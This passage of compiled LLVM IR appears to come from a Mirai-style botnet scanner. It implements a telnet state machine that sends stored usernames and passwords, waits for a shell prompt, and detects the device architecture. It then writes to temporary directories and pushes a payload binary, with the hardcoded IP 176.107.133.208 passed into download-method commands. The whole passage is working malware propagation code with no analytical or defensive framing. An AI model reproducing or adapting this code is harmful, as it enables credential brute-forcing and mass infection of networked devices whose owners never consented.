  %658 = getelementptr inbounds i8, i8* %653, i64 %657
  %659 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %660 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %659, i32 0, i32 4
  %661 = load i32, i32* %660, align 8
  %662 = sub nsw i32 8192, %661
  %663 = call i32 @recv_strip_null(i32 %650, i8* %658, i32 %662, i32 16384)
  store i32 %663, i32* %34, align 4
  %664 = load i32, i32* %34, align 4
  %665 = icmp eq i32 %664, 0
  br i1 %665, label %666, label %668

666:                                              ; preds = %646
  %667 = call i32* @__errno_location() #11
  store i32 104, i32* %667, align 4
  store i32 -1, i32* %34, align 4
  br label %668

668:                                              ; preds = %666, %646
  %669 = load i32, i32* %34, align 4
  %670 = icmp eq i32 %669, -1
  br i1 %670, label %671, label %698

671:                                              ; preds = %668
  %672 = call i32* @__errno_location() #11
  %673 = load i32, i32* %672, align 4
  %674 = icmp ne i32 %673, 11
  br i1 %674, label %675, label %697

675:                                              ; preds = %671
  %676 = call i32* @__errno_location() #11
  %677 = load i32, i32* %676, align 4
  %678 = icmp ne i32 %677, 11
  br i1 %678, label %679, label %697

679:                                              ; preds = %675
  %680 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %681 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %680, i32 0, i32 2
  %682 = load i32, i32* %681, align 8
  %683 = call i32 @close(i32 %682)
  %684 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %685 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %684, i32 0, i32 2
  store i32 -1, i32* %685, align 8
  %686 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %687 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %686, i32 0, i32 9
  %688 = load i8, i8* %687, align 4
  %689 = add i8 %688, 1
  store i8 %689, i8* %687, align 4
  %690 = zext i8 %689 to i32
  %691 = icmp sge i32 %690, 10
  br i1 %691, label %692, label %694

692:                                              ; preds = %679
  %693 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  call void @fdclose(%struct.scanner_connection* %693, i32 1)
  br label %696

694:                                              ; preds = %679
  %695 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  call void @setup_connection(%struct.scanner_connection* %695)
  br label %696

696:                                              ; preds = %694, %692
  br label %697

697:                                              ; preds = %696, %675, %671
  br label %1162

698:                                              ; preds = %668
  %699 = load i32, i32* %34, align 4
  %700 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %701 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %700, i32 0, i32 4
  %702 = load i32, i32* %701, align 8
  %703 = add nsw i32 %702, %699
  store i32 %703, i32* %701, align 8
  %704 = load i32, i32* @fake_time, align 4
  %705 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %706 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %705, i32 0, i32 3
  store i32 %704, i32* %706, align 4
  br label %707

707:                                              ; preds = %698, %1160
  store i32 0, i32* %35, align 4
  %708 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %709 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %708, i32 0, i32 16
  %710 = load i32, i32* %709, align 8
  switch i32 %710, label %1119 [
    i32 2, label %711
    i32 3, label %719
    i32 4, label %736
    i32 5, label %753
    i32 6, label %792
    i32 7, label %841
    i32 8, label %859
    i32 9, label %872
    i32 10, label %917
    i32 12, label %947
    i32 11, label %995
    i32 13, label %1070
  ]

711:                                              ; preds = %707
  %712 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %713 = call i32 @consume_iacs(%struct.scanner_connection* %712)
  store i32 %713, i32* %35, align 4
  %714 = icmp sgt i32 %713, 0
  br i1 %714, label %715, label %718

715:                                              ; preds = %711
  %716 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %717 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %716, i32 0, i32 16
  store i32 3, i32* %717, align 8
  br label %718

718:                                              ; preds = %715, %711
  br label %1120

719:                                              ; preds = %707
  %720 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %721 = call i32 @consume_login_prompt(%struct.scanner_connection* %720, i32 1)
  store i32 %721, i32* %35, align 4
  %722 = icmp sgt i32 %721, 0
  br i1 %722, label %723, label %735

723:                                              ; preds = %719
  %724 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %725 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %724, i32 0, i32 2
  %726 = load i32, i32* %725, align 8
  %727 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %728 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %727, i32 0, i32 0
  %729 = load %struct.scanner_auth*, %struct.scanner_auth** %728, align 8
  %730 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %729, i32 0, i32 0
  %731 = load i8*, i8** %730, align 8
  %732 = call i32 (i32, i8*, ...) @fdsend(i32 %726, i8* %731)
  %733 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %734 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %733, i32 0, i32 16
  store i32 4, i32* %734, align 8
  br label %735

735:                                              ; preds = %723, %719
  br label %1120

736:                                              ; preds = %707
  %737 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %738 = call i32 @consume_login_prompt(%struct.scanner_connection* %737, i32 0)
  store i32 %738, i32* %35, align 4
  %739 = icmp sgt i32 %738, 0
  br i1 %739, label %740, label %752

740:                                              ; preds = %736
  %741 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %742 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %741, i32 0, i32 2
  %743 = load i32, i32* %742, align 8
  %744 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %745 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %744, i32 0, i32 0
  %746 = load %struct.scanner_auth*, %struct.scanner_auth** %745, align 8
  %747 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %746, i32 0, i32 1
  %748 = load i8*, i8** %747, align 8
  %749 = call i32 (i32, i8*, ...) @fdsend(i32 %743, i8* %748)
  %750 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %751 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %750, i32 0, i32 16
  store i32 5, i32* %751, align 8
  br label %752

752:                                              ; preds = %740, %736
  br label %1120

753:                                              ; preds = %707
  %754 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %755 = call i32 @consume_shell_prompt(%struct.scanner_connection* %754)
  store i32 %755, i32* %35, align 4
  %756 = icmp sgt i32 %755, 0
  br i1 %756, label %757, label %769

757:                                              ; preds = %753
  call void @table_unlock_val(i8 zeroext 11)
  %758 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %759 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %758, i32 0, i32 2
  %760 = load i32, i32* %759, align 8
  %761 = call i32 (i32, i8*, ...) @fdsend(i32 %760, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.105, i64 0, i64 0))
  %762 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %763 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %762, i32 0, i32 2
  %764 = load i32, i32* %763, align 8
  %765 = call i8* @table_retrieve_val(i32 11, i32* null)
  %766 = call i32 (i32, i8*, ...) @fdsend(i32 %764, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.106, i64 0, i64 0), i8* %765)
  call void @table_lock_val(i8 zeroext 11)
  %767 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %768 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %767, i32 0, i32 16
  store i32 6, i32* %768, align 8
  br label %791

769:                                              ; preds = %753
  %770 = load i32, i32* %35, align 4
  %771 = icmp eq i32 %770, -1
  br i1 %771, label %772, label %790

772:                                              ; preds = %769
  %773 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %774 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %773, i32 0, i32 2
  %775 = load i32, i32* %774, align 8
  %776 = call i32 @close(i32 %775)
  %777 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %778 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %777, i32 0, i32 2
  store i32 -1, i32* %778, align 8
  %779 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %780 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %779, i32 0, i32 9
  %781 = load i8, i8* %780, align 4
  %782 = add i8 %781, 1
  store i8 %782, i8* %780, align 4
  %783 = zext i8 %782 to i32
  %784 = icmp eq i32 %783, 10
  br i1 %784, label %785, label %787

785:                                              ; preds = %772
  %786 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  call void @fdclose(%struct.scanner_connection* %786, i32 1)
  br label %789

787:                                              ; preds = %772
  %788 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  call void @setup_connection(%struct.scanner_connection* %788)
  br label %789

789:                                              ; preds = %787, %785
  br label %790

790:                                              ; preds = %789, %769
  br label %791

791:                                              ; preds = %790, %757
  br label %1120

792:                                              ; preds = %707
  %793 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %794 = call i32 @consume_resp_prompt(%struct.scanner_connection* %793)
  store i32 %794, i32* %35, align 4
  %795 = icmp sgt i32 %794, 0
  br i1 %795, label %796, label %840

796:                                              ; preds = %792
  %797 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %798 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %797, i32 0, i32 5
  store i32 0, i32* %798, align 4
  %799 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %800 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %799, i32 0, i32 1
  %801 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %800, i32 0, i32 0
  %802 = load i32, i32* %801, align 8
  %803 = icmp ne i32 %802, 0
  br i1 %803, label %811, label %804

804:                                              ; preds = %796
  %805 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %806 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %805, i32 0, i32 2
  %807 = load i32, i32* %806, align 8
  %808 = call i32 (i32, i8*, ...) @fdsend(i32 %807, i8* getelementptr inbounds ([141 x i8], [141 x i8]* @.str.107, i64 0, i64 0))
  %809 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %810 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %809, i32 0, i32 16
  store i32 7, i32* %810, align 8
  br label %839

811:                                              ; preds = %796
  %812 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %813 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %812, i32 0, i32 8
  %814 = getelementptr inbounds [16 x i8], [16 x i8]* %813, i64 0, i64 0
  %815 = call i32 @strcmp(i8* %814, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.108, i64 0, i64 0)) #12
  %816 = icmp ne i32 %815, 0
  br i1 %816, label %817, label %823

817:                                              ; preds = %811
  %818 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %819 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %818, i32 0, i32 8
  %820 = getelementptr inbounds [16 x i8], [16 x i8]* %819, i64 0, i64 0
  %821 = call i32 @strcmp(i8* %820, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.109, i64 0, i64 0)) #12
  %822 = icmp ne i32 %821, 0
  br i1 %822, label %831, label %823

823:                                              ; preds = %817, %811
  call void @table_unlock_val(i8 zeroext 11)
  %824 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %825 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %824, i32 0, i32 2
  %826 = load i32, i32* %825, align 8
  %827 = call i8* @table_retrieve_val(i32 11, i32* null)
  %828 = call i32 (i32, i8*, ...) @fdsend(i32 %826, i8* getelementptr inbounds ([142 x i8], [142 x i8]* @.str.110, i64 0, i64 0), i8* %827)
  call void @table_lock_val(i8 zeroext 11)
  %829 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %830 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %829, i32 0, i32 16
  store i32 8, i32* %830, align 8
  br label %1120

831:                                              ; preds = %817
  call void @table_unlock_val(i8 zeroext 11)
  %832 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %833 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %832, i32 0, i32 2
  %834 = load i32, i32* %833, align 8
  %835 = call i8* @table_retrieve_val(i32 11, i32* null)
  %836 = call i32 (i32, i8*, ...) @fdsend(i32 %834, i8* %835)
  call void @table_lock_val(i8 zeroext 11)
  %837 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %838 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %837, i32 0, i32 16
  store i32 9, i32* %838, align 8
  br label %839

839:                                              ; preds = %831, %804
  br label %840

840:                                              ; preds = %839, %792
  br label %1120

841:                                              ; preds = %707
  %842 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %843 = call i32 @parse_elf_response(%struct.scanner_connection* %842)
  store i32 %843, i32* %35, align 4
  %844 = icmp sgt i32 %843, 0
  br i1 %844, label %845, label %850

845:                                              ; preds = %841
  %846 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %847 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %846, i32 0, i32 1
  %848 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %847, i32 0, i32 0
  store i32 1, i32* %848, align 8
  %849 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  call void @setup_connection(%struct.scanner_connection* %849)
  br label %858

850:                                              ; preds = %841
  %851 = load i32, i32* %35, align 4
  %852 = icmp eq i32 %851, -1
  br i1 %852, label %853, label %857

853:                                              ; preds = %850
  %854 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %855 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %854, i32 0, i32 9
  store i8 0, i8* %855, align 4
  %856 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  call void @fdclose(%struct.scanner_connection* %856, i32 1)
  br label %857

857:                                              ; preds = %853, %850
  br label %858

858:                                              ; preds = %857, %845
  br label %1120

859:                                              ; preds = %707
  %860 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %861 = call i32 @consume_arm_subtype(%struct.scanner_connection* %860)
  store i32 %861, i32* %35, align 4
  %862 = icmp sgt i32 %861, 0
  br i1 %862, label %863, label %871

863:                                              ; preds = %859
  call void @table_unlock_val(i8 zeroext 11)
  %864 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %865 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %864, i32 0, i32 2
  %866 = load i32, i32* %865, align 8
  %867 = call i8* @table_retrieve_val(i32 11, i32* null)
  %868 = call i32 (i32, i8*, ...) @fdsend(i32 %866, i8* %867)
  call void @table_lock_val(i8 zeroext 11)
  %869 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %870 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %869, i32 0, i32 16
  store i32 9, i32* %870, align 8
  br label %871

871:                                              ; preds = %863, %859
  br label %1120

872:                                              ; preds = %707
  %873 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %874 = call i32 @consume_resp_prompt(%struct.scanner_connection* %873)
  store i32 %874, i32* %35, align 4
  %875 = icmp sgt i32 %874, 0
  br i1 %875, label %876, label %916

876:                                              ; preds = %872
  %877 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %878 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %877, i32 0, i32 15
  %879 = load i32, i32* %878, align 4
  %880 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %881 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %880, i32 0, i32 13
  %882 = load i16, i16* %881, align 8
  %883 = zext i16 %882 to i32
  %884 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  call void @report_working(i32 %879, i32 %883, %struct.scanner_connection* %884, i32 0)
  store i32 0, i32* %36, align 4
  br label %885

885:                                              ; preds = %901, %876
  %886 = load i32, i32* %36, align 4
  %887 = icmp slt i32 %886, 15
  br i1 %887, label %888, label %904

888:                                              ; preds = %885
  %889 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %890 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %889, i32 0, i32 2
  %891 = load i32, i32* %890, align 8
  %892 = load i32, i32* %36, align 4
  %893 = sext i32 %892 to i64
  %894 = getelementptr inbounds [15 x i8*], [15 x i8*]* @tmp_dirs, i64 0, i64 %893
  %895 = load i8*, i8** %894, align 8
  %896 = load i32, i32* %36, align 4
  %897 = sext i32 %896 to i64
  %898 = getelementptr inbounds [15 x i8*], [15 x i8*]* @tmp_dirs, i64 0, i64 %897
  %899 = load i8*, i8** %898, align 8
  %900 = call i32 (i32, i8*, ...) @fdsend(i32 %891, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.111, i64 0, i64 0), i8* %895, i8* %899)
  br label %901

901:                                              ; preds = %888
  %902 = load i32, i32* %36, align 4
  %903 = add nsw i32 %902, 1
  store i32 %903, i32* %36, align 4
  br label %885, !llvm.loop !15

904:                                              ; preds = %885
  %905 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %906 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %905, i32 0, i32 2
  %907 = load i32, i32* %906, align 8
  %908 = call i32 (i32, i8*, ...) @fdsend(i32 %907, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.112, i64 0, i64 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.113, i64 0, i64 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.114, i64 0, i64 0))
  call void @table_unlock_val(i8 zeroext 11)
  %909 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %910 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %909, i32 0, i32 2
  %911 = load i32, i32* %910, align 8
  %912 = call i8* @table_retrieve_val(i32 11, i32* null)
  %913 = call i32 (i32, i8*, ...) @fdsend(i32 %911, i8* getelementptr inbounds ([98 x i8], [98 x i8]* @.str.115, i64 0, i64 0), i8* %912)
  call void @table_lock_val(i8 zeroext 11)
  %914 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %915 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %914, i32 0, i32 16
  store i32 10, i32* %915, align 8
  br label %916

916:                                              ; preds = %904, %872
  br label %1120

917:                                              ; preds = %707
  %918 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %919 = call i32 @consume_resp_prompt(%struct.scanner_connection* %918)
  store i32 %919, i32* %35, align 4
  %920 = icmp sgt i32 %919, 0
  br i1 %920, label %921, label %946

921:                                              ; preds = %917
  %922 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %923 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %922, i32 0, i32 8
  %924 = getelementptr inbounds [16 x i8], [16 x i8]* %923, i64 0, i64 0
  %925 = call i32 @strcmp(i8* %924, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.116, i64 0, i64 0)) #12
  %926 = icmp eq i32 %925, 0
  br i1 %926, label %927, label %938

927:                                              ; preds = %921
  call void @table_unlock_val(i8 zeroext 11)
  %928 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %929 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %928, i32 0, i32 2
  %930 = load i32, i32* %929, align 8
  %931 = call i8* @table_retrieve_val(i32 11, i32* null)
  %932 = call i32 (i32, i8*, ...) @fdsend(i32 %930, i8* getelementptr inbounds ([142 x i8], [142 x i8]* @.str.117, i64 0, i64 0), i32 176, i32 107, i32 133, i32 208, i32 176, i32 107, i32 133, i32 208, i8* %931)
  call void @table_lock_val(i8 zeroext 11)
  %933 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %934 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %933, i32 0, i32 1
  %935 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %934, i32 0, i32 1
  store i32 3, i32* %935, align 4
  %936 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %937 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %936, i32 0, i32 16
  store i32 13, i32* %937, align 8
  br label %1120

938:                                              ; preds = %921
  call void @table_unlock_val(i8 zeroext 11)
  %939 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %940 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %939, i32 0, i32 2
  %941 = load i32, i32* %940, align 8
  %942 = call i8* @table_retrieve_val(i32 11, i32* null)
  %943 = call i32 (i32, i8*, ...) @fdsend(i32 %941, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.118, i64 0, i64 0), i8* %942)
  call void @table_lock_val(i8 zeroext 11)
  %944 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %945 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %944, i32 0, i32 16
  store i32 12, i32* %945, align 8
  br label %946

946:                                              ; preds = %938, %917
  br label %1120

947:                                              ; preds = %707
  %948 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %949 = call i32 @connection_consume_upload_methods(%struct.scanner_connection* %948)
  store i32 %949, i32* %35, align 4
  %950 = load i32, i32* %35, align 4
  %951 = icmp ne i32 %950, 0
  br i1 %951, label %952, label %994

952:                                              ; preds = %947
  call void @table_unlock_val(i8 zeroext 11)
  %953 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %954 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %953, i32 0, i32 1
  %955 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %954, i32 0, i32 1
  %956 = load i32, i32* %955, align 4
  switch i32 %956, label %981 [
    i32 0, label %957
    i32 1, label %963
    i32 2, label %972
  ]

957:                                              ; preds = %952
  %958 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %959 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %958, i32 0, i32 2
  %960 = load i32, i32* %959, align 8
  %961 = call i8* @table_retrieve_val(i32 11, i32* null)
  %962 = call i32 (i32, i8*, ...) @fdsend(i32 %960, i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.119, i64 0, i64 0), i8* %961)
  br label %981

963:                                              ; preds = %952
  %964 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %965 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %964, i32 0, i32 2
  %966 = load i32, i32* %965, align 8
  %967 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %968 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %967, i32 0, i32 8
  %969 = getelementptr inbounds [16 x i8], [16 x i8]* %968, i64 0, i64 0
  %970 = call i8* @table_retrieve_val(i32 11, i32* null)
  %971 = call i32 (i32, i8*, ...) @fdsend(i32 %966, i8* getelementptr inbounds ([125 x i8], [125 x i8]* @.str.120, i64 0, i64 0), i32 176, i32 107, i32 133, i32 208, i8* %969, i8* %970)
  br label %981

972:                                              ; preds = %952
  %973 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %974 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %973, i32 0, i32 2
  %975 = load i32, i32* %974, align 8
  %976 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %977 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %976, i32 0, i32 8
  %978 = getelementptr inbounds [16 x i8], [16 x i8]* %977, i64 0, i64 0
  %979 = call i8* @table_retrieve_val(i32 11, i32* null)
  %980 = call i32 (i32, i8*, ...) @fdsend(i32 %975, i8* getelementptr inbounds ([121 x i8], [121 x i8]* @.str.121, i64 0, i64 0), i8* %978, i32 176, i32 107, i32 133, i32 208, i8* %979)
  br label %981

981:                                              ; preds = %952, %972, %963, %957
  call void @table_lock_val(i8 zeroext 11)
  %982 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %983 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %982, i32 0, i32 1
  %984 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %983, i32 0, i32 1
  %985 = load i32, i32* %984, align 4
  %986 = icmp ne i32 %985, 0
  br i1 %986, label %987, label %990

987:                                              ; preds = %981
  %988 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %989 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %988, i32 0, i32 16
  store i32 13, i32* %989, align 8
  br label %993

990:                                              ; preds = %981
  %991 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %992 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %991, i32 0, i32 16
  store i32 11, i32* %992, align 8
  br label %993

993:                                              ; preds = %990, %987
  br label %994

994:                                              ; preds = %993, %947
  br label %1120

995:                                              ; preds = %707
  %996 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %997 = call i32 @consume_resp_prompt(%struct.scanner_connection* %996)
  store i32 %997, i32* %35, align 4
  %998 = icmp sgt i32 %997, 0
  br i1 %998, label %999, label %1069

999:                                              ; preds = %995
  %1000 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1001 = call %struct.payload* @get_retrieve_binary(%struct.scanner_connection* %1000)
  store %struct.payload* %1001, %struct.payload** %6, align 8
  %1002 = load %struct.payload*, %struct.payload** %6, align 8
  %1003 = icmp ne %struct.payload* %1002, null
  br i1 %1003, label %1006, label %1004

1004:                                             ; preds = %999
  %1005 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  call void @fdclose(%struct.scanner_connection* %1005, i32 1)
  br label %1120

1006:                                             ; preds = %999
  %1007 = load %struct.payload*, %struct.payload** %6, align 8
  %1008 = call %struct.binary* @process_retrieve_binary(%struct.payload* %1007)
  store %struct.binary* %1008, %struct.binary** %7, align 8
  %1009 = load %struct.binary*, %struct.binary** %7, align 8
  %1010 = icmp ne %struct.binary* %1009, null
  br i1 %1010, label %1013, label %1011

1011:                                             ; preds = %1006
  %1012 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  call void @fdclose(%struct.scanner_connection* %1012, i32 1)
  br label %1120

1013:                                             ; preds = %1006
  call void @table_unlock_val(i8 zeroext 11)
  %1014 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1015 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1014, i32 0, i32 2
  %1016 = load i32, i32* %1015, align 8
  %1017 = load %struct.binary*, %struct.binary** %7, align 8
  %1018 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1019 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1018, i32 0, i32 12
  %1020 = load i8, i8* %1019, align 1
  %1021 = zext i8 %1020 to i64
  %1022 = getelementptr inbounds %struct.binary, %struct.binary* %1017, i64 %1021
  %1023 = getelementptr inbounds %struct.binary, %struct.binary* %1022, i32 0, i32 0
  %1024 = load i8*, i8** %1023, align 8
  %1025 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1026 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1025, i32 0, i32 12
  %1027 = load i8, i8* %1026, align 1
  %1028 = zext i8 %1027 to i32
  %1029 = icmp eq i32 %1028, 0
  %1030 = zext i1 %1029 to i64
  %1031 = select i1 %1029, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.123, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.124, i64 0, i64 0)
  %1032 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1033 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1032, i32 0, i32 12
  %1034 = load i8, i8* %1033, align 1
  %1035 = zext i8 %1034 to i32
  %1036 = load %struct.binary*, %struct.binary** %7, align 8
  %1037 = getelementptr inbounds %struct.binary, %struct.binary* %1036, i32 0, i32 1
  %1038 = load i8, i8* %1037, align 8
  %1039 = zext i8 %1038 to i32
  %1040 = sub nsw i32 %1039, 1
  %1041 = icmp sge i32 %1035, %1040
  %1042 = zext i1 %1041 to i64
  %1043 = select i1 %1041, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.125, i64 0, i64 0), i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.126, i64 0, i64 0)
  %1044 = call i8* @table_retrieve_val(i32 11, i32* null)
  %1045 = call i32 (i32, i8*, ...) @fdsend(i32 %1016, i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.122, i64 0, i64 0), i8* %1024, i8* %1031, i8* %1043, i8* %1044)
  call void @table_lock_val(i8 zeroext 11)
  %1046 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1047 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1046, i32 0, i32 12
  %1048 = load i8, i8* %1047, align 1
  %1049 = zext i8 %1048 to i32
